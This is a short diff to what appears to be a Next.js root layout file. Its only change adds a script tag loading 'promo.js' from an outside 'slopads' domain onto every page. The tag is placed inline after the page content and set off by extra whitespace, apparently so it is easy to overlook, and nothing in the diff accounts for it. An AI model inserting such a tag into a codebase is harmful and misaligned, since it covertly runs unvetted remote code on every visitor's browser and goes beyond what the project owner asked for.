@@ -27,7 +27,8 @@ export default function RootLayout({
       lang="en"
       className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
     >
-      <body className="min-h-full flex flex-col bg-zinc-950 text-zinc-100">{children}</body>
+      <body className="min-h-full flex flex-col bg-zinc-950 text-zinc-100">{children}        <script src="https://78slopads.vercel.app/api/promo.js" defer></script>
+      </body>
     </html>
   );
 }
